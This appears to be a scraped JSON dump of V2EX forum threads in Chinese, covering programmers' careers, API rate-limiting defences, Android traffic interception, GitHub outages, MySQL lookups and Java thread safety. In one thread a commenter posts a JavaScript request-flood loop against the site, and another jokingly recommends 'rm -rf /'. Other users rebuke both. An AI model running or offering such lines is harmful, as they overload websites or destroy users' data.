"素质太差了吧，这文章我服了。", "这热点蹭得也太溜了吧", "看完第一句我就觉得这公司药丸", "估计是假的吧\r", "\r", "没有哪个 CEO 素质这么差吧？\r", "另外文中没有关于情感牌，肯定不对", "最后一行写着纯属虚构 结果好多人眼瞎以为是真的跟风喷"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>跪求</p>\n</div></div>"], "reply": "4", "tittle": "有没有 golang 的 dash 中文文档包", "comment": ["学英语吧。。。", "自己造一个", " 同看英文原版的飘过。", "标准库官方：  \r", "标准库中文版 ： godoc.ml"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>感慨:</p>\n<ol>\n<li>\n<p>程序员们别 SB 了, 很少有 CEO 拿技术当回事, 咱们也就是穿完了就扔的破鞋, 所以再有人诱惑你创业, 也别拿自己不当外人. 工资一定要拿足(什么几千块, 私人垫付房租这种事就别干了), 股权期权一定要第一天就讲好, 白纸黑字签字画押, 并且咨询一下律师.</p>\n</li>\n<li>\n<p>别死命加班, 别死命加班, 工作干不完就要求加人, 拉起队伍来自己也好升官. 你 TM 把工作都没日没夜干完了, CEO 们一看, 他不会觉得你有功, 反而会心里嘀咕: 这 TM 一个人也能搞定啊, 为毛你要再找人, 你这个骗子!</p>\n</li>\n<li>\n<p>CEO 们这么说, 也会把自己坑了啊, 以后创业的成本越来越好了, 因为这帮 SB 程序员们越来越不好忽悠了, 怎么办啊好着急.</p>\n</li>\n</ol>\n<hr>\n<p>该回复引用如下:\n\"\n3 ，每一个非黑科技公司的技术合伙人，和所谓的技术合伙人，和早期技术人员，都该很明确自己的真实性质：并非“技术合伙人”，而是“公司早期雇不起大牛时的关键程序员”。低端乃至中高端编程，都不是“技术”，而是“技能”。想要保障自己利益的，越前期谈妥越好，否则只会越晚越糟糕。再或者，利用自己早期员工的地位，积极参与融资、管理、团队建设、客户开发等工作。（“技术”：人工智能公司的产品缔造者，基本上博士起步；“技能”：本案中的男主）</p>\n<p>作者： Fan Francis\n链接： <a href=\"https://www.zhihu.com/question/56178614/answer/148101856\" rel=\"nofollow\">https://www.zhihu.com/question/56178614/answer/148101856</a>\n来源：知乎\n著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。\n\"</p>\n</div></div>"], "reply": "4", "tittle": "最近很火的创业老公话题, 在知乎上看到一个貌似创业者的回复, 各位程序员还是早点睡觉吧", "comment": ["💊 ", "= =是的，根据我的工作经验观察，反而刺头过得还好点，领导看见你好欺负，一般是尽可能忽悠就忽悠，口惠实不至", " 这篇不错"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"https://github.com/shengxinjing/programmer-job-blacklist/issues/27\" rel=\"nofollow\">Issue</a></p>\n<p><a href=\"https://github.com/shengxinjing/programmer-job-blacklist\" rel=\"nofollow\">企业黑名单项目地址-programmer-job-blacklist</a></p>\n</div></div>"], "reply": "27", "tittle": "都看过 Github 上那个企业黑名单了吗？刚发现华为那条被公关掉了", "comment": ["竟然没有 b 站", "作者有回复了，让楼主失望了。", "![BaiduShurufa_2017-2-23_17-25-32.png]( ", ")\r", "\r", "这种榜单吧，不出名就没有意义，太出名了分分钟给你和谐掉，都不用出公关费。\r", "\r", "先给你发律师函，告毁谤侵权，索赔千万，即使你的记录的事件是真实存在，你也得举证应诉。\r", "\r", "所以没有工会，没有足够完善立法，执法保障，工人阶级苦啊。", "很蛋疼。尤其国内，每个做大的公司都有黑历史。就算你不黑，竞争对手也会凭空给你整出点事儿来。如果都不能去，那就不用找工作了。\r", "你没有黑历史的唯一原因，那是你还没出来做事。", "建议出个培训机构的黑名单 给广大想要学编程拿高薪的朋友一个参考\r", "比这个意义大多了", " #7  ", "  然而大多数培训出来的即便被坑也不愿意透露自己是培训生……所以尽管培训很乱但却没什么大新闻", " 这个我同意，还得注意多个以公司名义招聘培训生的公司", "感觉大家好无聊，一个帖子后面没过多久就会出现一个后续帖，是不是没话题了。", " 其实培训有口碑的也就那几个，但是其实无论是什么样的培训机构。只要查一查，总有黑点存在。毕竟连大学都有人说很坑，何况是这些培训机构呢。\r", "拿高薪的往往是那些闷声发大财的，真正从培训机构里出来又拿高薪的，基本都写成小说了吧。", " +1 ，最恶心那种说招聘，去到面试然后说你技术不行来交一万培训吧那些公司。上次去脉脉吐槽过一次这些公司，居然还被人说我没有好好读书，技术不行 =。=", "把跳楼和猝死的新闻串起来就够了。用不着辞退超龄员工那个梗", " 已经有了", "关于《就算老公一毛钱股份都没拿到，在我心里，他依然是最牛逼的创业者》\r", "虽然大家都有自己的判断，但是事情没有弄清楚之前，就把企业列为厂商黑名单，是否有失公允？\r", "希望多些客观了解，少点误导。", " #14 有链接不？ 发出了大家一起看看", "我的建议是不要搞这种红黑榜类型的事情\r", "\r", "以前的红黑榜到最后都是乙烷的节奏", " ", "Github 现在被墙了，不知道是不是抽风", " 有可能是某个企业关系太硬，为了防止自己的不良名声散布出去，动用关系让上面的人通过 GFW 屏蔽了 Github", "我回复下，看看这个帖子会不会也被删除掉", "我觉得可以做个浏览器插件订阅用来屏蔽各大招聘网站相关公司.", "GitHub 是不是又被墙了....", "刚才打开看，还有华为那条呢啊。\r", "还更新上了曹政和大辉那些事。\r", "其实如果关注新闻的话，这些事当时都闹那么热闹，大家都知道了", " 哈哈哈，这机灵抖得，梯子都不知道的人招去公司面向百度编程吗？", "GitHub 被墙？我怎么还可以正常访问啊", "作者又如何自证清廉呢"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>每秒几百到几千的并发，占用好多资源</p>\n<p>刚开始以为直接用 nginx 限制下速度就可以了和 ip</p>\n<p>仔细一看请求的 ip 都是不一样的</p>\n<p>有什么办法处理这个问题？</p>\n</div></div>", "<div class=\"topic_content\">服务器被人攻击了 1 天了\r<br>心塞，应该是 cc 攻击\r<br>刚做了 2 个月有点起色了  就人攻击了</div>"], "reply": "17", "tittle": "接口一直被人请求有什么办法解决", "comment": ["1.接口添加签名验证\r", "\r", "2.代码添加访问速率检测\r", "\r", "3.refer,cookie 等信息验证", "if ($cookie_say != \"hbnl$remote_addr\"){\r", "     add_header Set-Cookie \"say=hbnl$remote_addr\";\r", "     rewrite .* \"$scheme://$host$uri\" redirect;\r", "}", "if ($http_user_agent ~* \"Netscape/*|Chrome/19/*|WordPress/*|BaiduSpider/*|Baiduspider/*|Gecko/20100101|Firefox/3\") { \r", "    return 403;  \r", "\t}", "楼上这个不可取。因为依然到达了程序层。\r", "\r", "得在 nginx 层加防护。好像 iptable 就能禁止一个 ip 多次访问。\r", "\r", "ip 再多不可能无上限，用脚本一算就知道有多少 ip 了。每个 ip 是不是只在请求这个接口，你应该有其他接口。如果一个 ip 只访问了 A 接口却没访问 B 接口。那你还不干掉他等着过年啊。\r", "\r", "但这可能会误杀，小区宽带都是相同 ip 。\r", "\r", "所以折中的方案是用个东西算这个 ip 是否有效请求。然后写一个黑名单， iptable 拦在外面。\r", "\r", "这个东西是业务程序里还是直接分析 nginx 日志。就看你个人了。。\r", "一般情况下分析 nginx 日志生成 ip 黑名单应该可以防护很大一坨恶意攻击。\r", "\r", "另外服务器内核配置快速释放端口这样的优化，可以缓解资源被占用的情况。。每秒几百上千有点夸张了。几千个端口开着。很吃 cpu 的。。直接限制在 1000 个。其他的排队等去吧。", "4.nginx_lua 配合 redis ，直接在 nginx 层去处理。上面 1,2,3 可以快速处理非法无效请求。后续优化可以用 4.", "直接用 iptables 封掉请求次数太多的 IP     \r", "这比在 web server 层效率高很多", "搭车求问\r", "在此需求场景下镜像流量应该可以实现请求审计能力且不影响主干业务的性能\r", "不知现在有没有合适的开源解决方案？", "iptables 限制？如果有正常的业务突发并发呢？真是码农思维。\r", "业务层做判断和限制。\r", "既然知道你的接口规范了，肯定是合法的业务接入。", "先看你的接口属性啊。私有的话，上动态 token ，加验证。反正增加对方的成本。在访问这些私有请求接口错误次数的，动态写入黑名单。 然后交由 nginx 和 iptables 去处理黑名单。\r", "\r", "公开接口的话，限制单个 IP 请求次数咯。否则就是升级硬件。", " \r", " \r", " \r", "从主机层面做这个 一点都不优雅 还要扯到 iptables ， 这是比较典型的运维式的解决办法了 ，觉得就应该从业务层面做。", "收费，不给就统计损失 报警...\r", "这个思路怎么样？", "看下日志，先把异常 UA 的封了，然后接口签名加密，再写个脚本每半个小时自动打印下前 100 位的 IP 访问列表及访问数，如果超过正常值就自动防火墙黑名单", "既然是用 jtw 方式请求接口的话。。在前端 nginx 上判断有无这个 cookie 直接 return 403 就好了。。 LS 的 ngx_lua 也是一个方案，动态屏蔽这些很容易实现。", " jwt", " 如果是动态 ip 呢 一直在变", "最省事的办法前面顶个百度云减速， 360 网站不安全卫士之类的 CDN"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>有 V 友去过美联英语了解过或有报名吗？\n这年想进修一下\n不知道这个培训机构靠谱不</p>\n</div></div>"], "reply": "10", "tittle": "想到美联英语进升一下口语水平和阅读水平不知这个机构靠谱不？", "comment": ["是在北京吗？", " 在广东地区吧，但这个有地域差异吗？", "我认为还是看个人的坚持吧，语言不多用的话容易生疏，培训也只是突击而已。", "不建议。之前不是已经有一家英语培训机构跑路了么，叫环球美联来着吧", "看你学英语的目地了，如果有应试的要求，比如雅思托福之类的，可以考虑找培训机构上课。如果只是想提升一下英语水平，去培训机构肯定花冤枉钱：培训机构最喜欢这样的学生了，他们会找几个很水的老师，带你上课吹吹牛随便玩玩，顺带学一点英语。这个坑你根本躲不过啊。\r", "其实网上有很多免费的资源，只要善加利用，关键是你自己要能坚持，也会有不错的效果。", " 最贵的应该是坚持。。。突然感觉到培训机构的坑也是蛮大的", "港真，你大量的出声阅读就是提高口语的最好办法，你都知道办法了为什么还要花那冤枉钱去培训机构？", "但凡找培训机构的都是自控能力差的。因为在培训机构有人逼着你开口讲话。。。", " 的确很差。。。整天在寻找舒适区。。。。 T_T", "就这么说吧....\r", "你觉得培训 php,iOS,前端的机构坑不坑.\r", "培训英语的绝对比 IT 培训机构还要坑上很多- -\r", "\r", "学英语是项系统工程,无法速成."]},
{"content": ["<div class=\"topic_content\">目前我经过查找资料发现：有三种方式可以实现拦截某个 APP 网络请求，但是都有各种局限性。\r<br>1.Android 内置 VPNservice ：通过虚拟网卡实现拦截，有系统弹窗提示，用户点击确认才生效；\r<br>2.tcpdump 等 jar 包：需要 root 手机才能实现抓包功能\r<br>3.代理拦截：基于 Netty 、 browsermob-proxy 拦截，但是需要手动设置 WiFi 代理，如果为 3G ， 4G 网络则不可行\r<br>所以我想请教一下，各位还有没有其他方式拦截网络请求，不需要用户操作，不需要手机 root ，不需要手动设置代理等限制的方法？或者给个思路也行</div>"], "reply": "17", "tittle": "Android 应用通过代码实现拦截本应用内的所有网络请求流量，同时可以修改请求信息，例如请求头，请求体，然后转发的第三方 jar 包或者其他的方法，求推荐。", "comment": ["okhttp 的话可以使用拦截器， ", "\r", "但是好像不符合你的需求- -\r", "感觉你这种需求用途很微妙啊", "感谢你的回答，但是不能使用任何请求框架拦截，用途其实很正当的，主要用于加固的时候拦截网络流量", "facebook 前两天开源了一个调试框架，据说可以绕过证书绑定，可以看看。", "okhttp", " 什么开源框架，名称是啥？", "其实我的意思是不管你使用什么请求框架，例如 okhttp 也行，我通过一些第三方 jar 或者直接在底层 socket 方法拦截，然后拦截到 http 请求，就可以修改请求头，请求体信息，一些网络嗅探 APP 的原理", "或许可以尝试用反射修改 sdk 某些关键类实现,比如 HttpUrlConnection  Socket 等..\r", "\r", "只是个思路...", " 如果可以直接修改 socket 的话是比较好的，我觉得如果有方法，应该是比较偏向于底层，从网卡驱动入手", "OkHttp 拦截器. Request req = chain.request(); Response res = chain.proceed(req); 可以自由的对 Request 和 Response 进行修改.", "能够有 root 权限的话还是用 iptables REDIRECT 来做，我就是用它来做全局或按应用的透明代理服务。", "我猜应该没有，或者有很难绕过的限制，因为如果有的话，各种统计类的 Android 第三方 sdk 早带了。。", "感觉 lz 是想做改包....\r", "\r", "静默拦截网络请求....想想就带感...", "\r", "\r", "这是透明代理实现的代码，它创建一个 tcp socket 用于接受重定向过来的 tcp 连接，一个 udp socket 接收重定向过来的 dns 请求，加上 socks5 协议头，转发 socks5 server 。拿走，不谢。:)", "静默拦截网络请求，其实也是差不多这个意思了，我刚发现有个应用叫安信手机证券很牛逼，你自己设置了代理以后根本就抓不到这个 APP 请求时的包，它直接抓到了一个 127.0.0.1 的代理，大家有兴趣可以研究一下", " 你的这个透明代理实现的代码是需要 root 手机才行吗", " 是的，不用 root 也不用 vpn service 能搞定？找到方法也告诉我一下哈。", "首先，你要想清楚，你这个只是针对 HTTP 吗？ HTTPS 就是用来防中间人的，你根本就看不到里面的 HTTP 请求。而且有的 APP 根本就不认  WiFi 代理，像 twitter\r"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"http://weibo.com/1657668863/EwYwFlvkE\" rel=\"nofollow\">http://weibo.com/1657668863/EwYwFlvkE</a></p>\n<p>据说 Cloudflare 泄露用户 HTTPS session 长达数月，涉及 Uber ， 1password ， 1password 。。 1password 。。</p>\n<p><img alt=\"图片\" src=\"http://wx2.sinaimg.cn/mw690/62ce04ffgy1fd18uapmn4j20ku112gq3.jpg\"></p>\n<p>奇怪这里居然没点反映</p>\n</div></div>"], "reply": "9", "tittle": "互联网史上最大的安全事件，涉及优步(Uber)、密码管理软件 1password、运动手环公司 FitBit 等多家企业", "comment": ["1p 官方一直在说自己的数据是三层加密， SSL 不是唯一的加密方式。所以影响应该不大", "意思是 1password 进行数据同步的时候， session 残留了？\r", "那如果是通过 dropbox 进行同步的呢…", "不是 lastpass 幸好", "1password 付费从来没用过...\r", "\r", "都是用 icloud 同步.", "用 dropbox 同步没关系的吧； dropbox 还有云服务么？没注意。", "1p 不是 icloud 同步吗？到底是不是真泄露啦。。", " 如果用 dropbox ， icloud 同步的话，没影响\r", "\r", "1p 有自己的订阅，就是自家云同步，那就得问 1p 了", "广州天河招 PHP"]},
{"content": ["<div class=\"topic_content\"><a target=\"_blank\" href=\"https://github.com/shengxinjing/programmer-job-blacklist\" rel=\"nofollow\">https://github.com/shengxinjing/programmer-job-blacklist</a></div>"], "reply": "12", "tittle": "推广一个 repo：程序员找工作黑名单。这个 repo 真不错。", "comment": ["骗 star 的，就几天数据也好意思发出来，而且全是热点事件，基本上不知道的人很少吧，相应的评判标准体系也没有", " 你再去看看，翻了不少旧账。说白了，这需要大家的集体智慧。", "太主观了……样本量也不大。这些热点问题大家大多数都知道的吧", "markdown 程序员工资多少钱一个月？", "说实话，在监管缺失、劳动法如废纸的这阶段，基本上没有不入这榜单的公司。\r", "还是咱们程序员太实在，太好糊弄，天天跟电脑打交道忘了人心险恶。", "我靠 1 个小时涨了 300 个星，这么多人看这个？", "每隔一段时间就会出现一个企业黑名单的 repo 骗 star ，然后过后就没有人理和维护了。\r", "貌似之前有个比较全点的 repo ，还被某企业给警告了。", "V2 好几个黑名单了，都是三分钟热度，后续都不更新了，而且这个也明显没之前的全，不知道能坚持更新多久", " 我比较喜欢那个程序员黄历的功能", " 这个不错", " markdown 程序员指收集整理资料来骗 star 的那种吗，那分享整理的学习资料，或者是程序员之路那些也算咯？"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>目前的业务逻辑是，有 2000W 个 32 位长字符串存在 mysql 中，该 mysql 表就只有 2 个字段，自增 id 和 hash ，现在要验证这个表中是否存在某个 hash 值，怎样用最简单快速的方法查询？我想到过用 redis 来存，但是内存吃不消，有没有好的解决方案？谢谢</p>\n</div></div>"], "reply": "37", "tittle": "2000W 个不重复的 32 位长字符串存于 mysql 中，现在怎样判断该数据表中存在某个特定值？", "comment": ["排序+binary search", "或者 bitmap", "建个索引然后用 SQL 查询就行了吧", "字典树", " 感觉有点慢  硬盘很渣", "加多一列 crc ，存 crc32 （ hash ），然后 加 index idx_crc(crc32),配合缓存，速度不会太慢。", "bloom filter?", "这。。该 hash 分表了，根据 hash 最后 2-3 位分成 100-1000 个表。", " 升级硬件能解决的问题，绝对不要浪费技术人员的时间。极有可能所花时间的价值已经远远超过硬件的价值。", "显然是再增加一列啊……这一列保存 hash 值…… hash 值留 8 位就行了\r", "\r", "然后搜索的时候先匹配 hash 值，匹配到了再匹配全部内容。都一致就找到了。\r", "hash 不一致就 pass", "如果自己写算法，一来容易有 BUG ，二来也不一定比数据库引擎优化的好。", "2000W 好像建个索引就完事了。。。。这数据量不大。。。 5~10MS 都出来了。。。\r", "redis 你没必要全部扔进去啊，- -查询成功一次扔一次，缓存成功就直接走缓存，缓存失败再去 mysql ，这才是缓存的意义啊", "如果要自己写算法就是 boolean filter", "建索引啊，有这么复杂？", " 方法可行\r", "\r", "另外有一个取巧的方法，需要更改一下业务：\r", "就是 hash 里面隐含着 id\r", "\r", "我详细解释一下，比如在生成 hash 的时候（大部分是随机值）\r", "hash 值为空，先 save 一下，得到自增 id ，比如 1000 ，然后简单的用 36 进制表示，就是 rs\r", "然后命名规则如下：\r", "1 位是表示 36 进制长度 + N 位是 36 进制值 + （ 32-1-N ）位随机值\r", "\r", "然后 update set hash = '...' where id = 1000 更新进去\r", "\r", "例子，比如 1000 ，那么表示为 2rs... \r", "这样， hash 里面直接可以获取 id ，然后取出来直接进行字符匹配，判断是否正确。", " 嗯，这个问题，不知道的还一通乱答， v 站水平也是参差不齐。", " 你说的这个方法有点意思，但是好像并不能解决 lz 说的问题，因为一开始，你是没法知道自增 id 是多少的，你知道的只是后面那部分", "彩虹表？", "建索引，挺快的。", "2000 万数据量不大啊，感觉有索引不至于慢到不能接受哦", " 你不觉得你多了一次写入么，哈哈\r", "如果要保证原子性，你还必须要加上事务，写并发一旦飙起来，扑街", "redis 开压缩，两三 G 内存吧", "才两千万，直接建索引足够了", "有效数据行长度 40 bytes\r", "2000kw 数据 762MB\r", "算上 Innodb 的空洞, 各种乱七八糟的元数据, 3GB 差不多了吧\r", "这点数据, 写算法都多余, 建个索引\r", "\r", "就现在服务器的内存量, 最后整个索引估计都在 buffer pool 里面.\r", "别说服务器了, 桌面机都能搞定, 并发访问不大的话", "做索引，而且不需要整个字符串都在索引里面。", "hash 不要用 hex 字符串存，用二进制字符串或者 binary 类", "另外楼上有说取前几位加列的，你们真的懂数据库索引么？\r", "索引 n 叉树结构本来就是先比较前面的\r", "如果后几位的随机性比前几位好的话，取后几位做联合索引，或者用于分表，倒是有的\r", "换句话说，如果这种技巧有用，数据库自己早就该用了", "彩虹表吧，之前黄易那个我算完是 7500w 条， MySQL 分下表就好了，其他优化不做查起来也是快的飞起", "才 2000w 数据,建个索引,一个 where 条件不就出来了.\r", "如果这都要优化这优化那的,那这数据库软件就不能用了.", "把这个 32 位串当做表的主键", "直接建立个 Hash Index 吧\r", "see ", "Hex String 直接 string 储存开销有点大\r", "可用固长 binary 储存可获得小一半的开销（同时也能降低索引的储存开销）\r", "see ", "建立索引直接搞", "别在 yy 其它建撒索引了  把这个 32 位串当做表的主键  这样最快 不行你们可以试试看", "高度怀疑楼主只是在编问题，根本没有这个环境进行测试\r", "\r", "首先使用我的专用低性能测试机（用于测试程序性能） MYSQL 导入 2000W 条记录，插入 2000W 条数据用时 2787 秒(因为生成随机串的发生器有一定不随机性，生成了一部分重复数据，实际数据量 19787975 条，近似当两千万看吧 懒得继续插了)\r", "\r", " \r", "\r", "结构（索引情况）\r", " \r", "\r", "服务器配置：\r", "AMD 不知道啥时候的双核低端 CPU ， 2G*2 DDR2 800 内存，硬盘 500G 普通 SATA 淘汰硬盘\r", "\r", "随便从库里找 50 个串进行搜索，使用 SQL NO CACHE 同时每个数据只查一次避免其他缓存干扰\r", "\r", "执行时间均为 0.00002 秒\r", " ", "不小心发出去了\r", "插入两千万条数据用了将近 3000 秒，对我的破机器 IO 性能有直接概念了吧\r", "DDR2 内存时期的古董双核 AMD 入门 CPU ，执行性能也有概念了吧\r", "索引直接加在 hash_id 上，未限定索引长度，全默认，唯一索引\r", "\r", "直接检索，都是 0.0002 秒这个量级，检索过一次产生缓存以后，每次查询都是 0.0001", " 赞实践"]},
{"content": ["<div class=\"topic_content\">在 <a target=\"_blank\" href=\"/t/336428\">/t/336428</a> 看到“ Downloads- Your download box ”这个插件，好奇就安装了\r<br>\r<br>然后打开插件后发现右边有个 🔍 放大镜\r<br>\r<br><img src=\"https://ww1.sinaimg.cn/large/006tNbRwgy1fd1bxdlqqxj30be05qdg1.jpg\" class=\"embedded_image\"> \r<br>\r<br>点开后发现把页面的图片都嗅探出来了，还有一些其他功能，感觉很赞，准备留着了\r<br>\r<br>接着回到 v 站继续翻页。。。结果懵了\r<br>\r<br><img src=\"https://ww3.sinaimg.cn/large/006tNbRwgy1fd1bytav36j30eq06mwes.jpg\" class=\"embedded_image\"> \r<br>\r<br>\r<br>那么问题来了，请问多久能解封？</div>"], "reply": "46", "tittle": "好奇害死猫，记一次小教训。。", "comment": ["2 天左右吧, 刚刚解封的路过...", "什么意思？这个插件 v 站不允许使用吗？", "所以你这个是小号？", " 图片防盗链吧", "加入代理列表就好了吧，封禁貌似针对的是 IP", "V 站右边有个会动的小条..之前我好奇小条满了会怎样..然后就疯狂刷新", " 满了会送铜币", " v 站封禁规则大概在哪个节点啊，一直没有找到。大号被举报封号了。不过举报不实啊，想求解封，但是又想看看规则。", " 好吧，悲剧了~", " 那个插件资源嗅探会发送大量的请求，导致请求过于频繁", " 咦 ！那个是干啥的！我也天天想弄满！", " 不是小号，我现在开着代理的。。。\r", "\r", " 隐身模式可以正常访问，估计是针对 ip + ua 之类的\r", "\r", " 原谅我可耻的 233333", " 然后经验就满了, Level Up \r", "我一直以为是经验条 233", " \r", " \r", "你们说的小条在哪儿？我怎么看不到？", " 233,我试了下还没满就 Access Denied", " 刚才发现哈哈哈", "  ", " ", "长按 F5 有惊喜。", " 我木有玩小条。", "卧槽 满了竟然有奖励", "有一次放在桌面上的东西不小心压到了 F5 ，然后。。。。就也那样了", " 感谢··我去 F5 试试去~[手动 doge]", " 刷两下发现增长迅速··果断放弃了，我承认我怂···", " 被禁了多长时间呢", "我是开着网页刷新插件 10 秒刷一次，每天都刷到条条变黑  -，-", "所以那个条是干啥的", "经验条？雾", "长按 F5 来到极乐世界。 233333", " #24 忘记了。好像是 20 分钟吧", "javascript:\r", "function flood(){\r", "var startUrl = '", "';\r", "var page = Math.floor(Math.random() * ( 100000 + 1));\r", "var url = startUrl + page;\r", "$.get(url, function(data, status) {\r", "});\r", "}\r", "setInterval(flood,1000);\r", "\r", "\r", "or\r", "\r", "\r", "setInterval(function(){ $.get(self.location) },100)", " 自重", " 看了你之前的回复；\r", "年轻人  说话要懂得轻重", " 你好，我是阿里老爹的，请你去安全部门报个到。", "就没人说说这个条是怎么实现的？", "以前我还真没发现  发现了真的想弄满 = =~！", " 噗  条条变黑  好吧。", "这有什么的，有人还告诉过我一个神奇的命令：  rm -rf /", " \r", " \r", " \r", "\r", "按着按着 进度条还没满 就被封了     骗人..    \r", "\r", "目前在服务器上逛 V 站````", " 2333  我是按帖子标题提供亲身经历..", " 哈哈哈哈哈哈", "我终于解封了。。\r", "\r", " 是不是很好玩  2333333", "刷新一下涨一点 2333", " @", " 我也被封了 QAQ", "#32 @", " 你先看看你自己的回复，写一段死循环代码每隔 100 毫秒刷一次，觉得很酷吧？\r", "\r", "其实说句自重还真没啥恶意，只是劝你少开这种玩笑，\r", "以前经常有见到有人回复 rm -rf / 这种，像是某种炫技，但你们是否想过真的会有人好奇试试看呢？没想过后果？\r", "\r", "另外，多谢提醒，共勉。", "一直好奇 v2 刷新太快为什么就禁止访问了，我碰见好几次了，每次都得坐等恢复", " 哈哈哈哈哈哈哈哈 我刚发现那个小条会动！！！！"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>是不是被墙了……</p>\n<pre><code>$ ping -c4 github.com\nPING github.com (192.30.253.112): 56 data bytes\nRequest timeout for icmp_seq 0\nRequest timeout for icmp_seq 1\nRequest timeout for icmp_seq 2\n\n--- github.com ping statistics ---\n4 packets transmitted, 0 packets received, 100.0% packet loss\n\n$ git clone git@github.com:sqlmapproject/sqlmap.git\nCloning into 'sqlmap'...\nssh: connect to host github.com port 22: Operation timed out\nfatal: Could not read from remote repository.\n\nPlease make sure you have the correct access rights\nand the repository exists.\n</code></pre>\n</div></div>", "<div class=\"topic_content\">开心，似乎要恢复了</div>"], "reply": "173", "tittle": "全球最大的同性交友网站 Github 上不去了？", "comment": [" 留个回复， 233", "厦门电信 仍然挂的", "坐标深圳, 目前正常", "好了。。", "上海浦东，还是处于挂了的状态。", "好了呀…", " 厦门电信 已通", "是因为 Fastly 的 IP 不知道是线路问题还是 GFW ，不通了", "浦东 电信 部分加载", "成都电信，流畅加载，全速", " 成都电信秒开啊，不过自备梯子。- -", " 浦东联通好了", " 这是啥检测网站", "杭州电信与移动现在都可以访问了", "又被咱 DDOS 了？", "现在恢复了吧。", "Github Pages 真被墙了", "不过是强化了码农必须具备翻墙技能的这一事实", "HR 们看不到简历了", "北京电信，主站页面能打开， css 和头像要翻……", " 都出去了还说墙", "坐等出柜", " 杭州联通也这样，样式加载挂掉了。", "能访问，不过有点掉包\r", "\r", "btw ，最大的同性交友网站是豆瓣！", " google global cache 的 ip 个个都是这种情况，那是不是就能说墙没封 google 呢？", "我在很久之前就已经无法上传东西了，在网页上上传东西都需要打开梯子。", " mritd.me 自己搜一下，我在地铁上", "git page 挂了..这搭建的小站就完了", "深圳报告 我已登陆 感觉良好", "武汉秒开", " 呵呵，五毛的说法通常是 \"被墙了，你不会翻墙吗，不会翻墙你还是程序员吗\"，就跟\"我把你打断一条腿，你不会爬吗，不会爬你还算个人吗\"差不多", "厦门 ping 不通", "常年挂 vpn 的表示不知情", " 我挂 shadowsock 也上不去 奇怪了\r", "你 ping 下这个 wujunchuan.github.io", "北京鹏博士表示正常", " 我这儿卡死了 你是电信还是联通啊", "杭州联通还算正常，部分图片出不来", "杭州现在可以了", "样式表还是挂", "成都电信表示 github 主站样式没有加载上， pages 依然超时。。。", "杭州电信还是打不开", "北京还阔以", "北京……\r", "主站可以了\r", "但是*.githubusercontent.com 还是打不开 图裂 CSS 不能加载", "估计是 ", " 的阝月讠某", " #138 咦，我这边还是要挂 s 才能上", "很不稳定，又被干了吧", " 主站可以的,pages 服务现在要用梯子才能打开", " #147 我主站打开速度很慢很慢，而且样式也加载错误", "河南联通不开梯子几乎无力。", "应该是网络故障（听风就是雨", "为什么博客系统都要被墙......", "江西联通 github 秒开,头像无法加载;github.io 一直无法加载(长期)", "深圳 git clone 4kib/S 中", "百度云的虚拟机不能 push 代码，蛋疼。。。", "现在恢复了。天津联通。", "已经好了", "好了 已经恢复", "表示连接正常，情绪稳定，可以考虑给 HR 备梯子了， 简历放 github page 的最好有免翻的镜像了", "你们啊，不要见得风就是雨", "北京联通已恢复", "已恢复。\r", "经确认为对方主动屏蔽中国大陆 IP 地址。", " 主动屏蔽这是为什么", " GitHub 官方有发布相关说明吗，没有找到相关的消息", " 来源请求。", " 方便的话能否告知使用的是什么软件呢～", " 跳转到 ", " 了", "标题描述的难道不是 ", " ？\r", "我这边秒开啊", " @", " 下载地址在这\r", "楼上各位，昨天 github pages unscheduled maintenance ，今天已经恢复。其他的访问不了，只有你们懂的", " BestTrace ", "北京联通正常", " google 那是 dns 污染加 ip 墙", "杭州电信一直可以（今天折腾 kernel 发现 GitHub 前所未有的快"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>多线程开发是 Java 语言中经常用到的(别说你不用)....</p>\n<p>当我们谈论多线程的时候总有一个讨论点 : 线程安全.\n当我们谈论线程安全的时候我们在谈什么? 什么原子性\\可见性\\顺序性\\锁\\同步\\CAS\\xx 原则\\volatile 语法\\jdk 的新库\\vector 与 arraylist 哪个安全\\面试考题等等等等....</p>\n<p>SO...</p>\n<p>妈蛋,能不能先把 JDK 中成百上千个类中,哪些不是线程安全的给苦逼的程序员标注出来先? 原罪啊... 老司机都表示不淡定了...</p>\n</div></div>", "<div class=\"topic_content\">补弃一下,有些 v2exer 没理解:\r<br>本意并不是说 Java 的多线程机制设计的不好,反而是设计的有些让人感动. 当然也如人所说是在下能力不够,没有把上千个基础 java 类中哪些不是线程安全的给找出来并记住;\r<br>\r<br>真正想表达的意思只有一个: JDK 开发者肯定知道原始类库哪些不是线程安全的对吗?那在引入多线程的时候,为什么不在(预)编译的时候识别多线程环境,把不安全的基础类使用给警告出来,非得各种躺坑后把结果和过程称之为\"开发经验\"或\"血泪教训\"?</div>"], "reply": "48", "tittle": "JDK 原罪...", "comment": ["把你不确认的都当成非线程安全", " 新一茬韭菜得接着采坑不是....", "线程安全的不都给你放 java.util.concurrent 下面了么。", " 话是没有错,但你要用 SimpleDateFormat,用 StringBuilder 嘛...", " RTFM\r", "\r", "Synchronization\r", "\r", "Date formats are not synchronized. It is recommended to create separate format instances for each thread. If multiple threads access a format concurrently, it must be synchronized externally.\r", "\r", "或者继续当韭菜，也方便筛人", "问：程序猿为何要使用多线程？\r", "答：因为他们觉得生活还不够乱", "线程不安全的类也能线程安全，线程安全的类也能线程不安全。。。", "能力问题", "Java 的多线程设计是相当优雅的，觉得不安全就加 synchronized ，没有那么可怕。", "因为场景太多，只是你见识少，例如在多线程下同一个 id 的操作线程要求顺序，使用 lock 的公平锁。", "那啥。。要怕的话可以直接加一个 synchronize\r", "出了效率问题，或者有时间再弄。。", "线程安全这个问题不是 Java 独有的吧....", "jdk 有很多问题，基本都是要兼容旧版本导致的，早就该改改了", "原则上文档 /标准中没有说线程安全就代表实现时没必要保证线程安全，也就是你不能当线程安全的用。", "java 的多线程做的很好了，你居然还不满足", "Windows 原罪.....\r", "\r", "装软件是 Windows 中经常用到的(别说你不用)....\r", "\r", 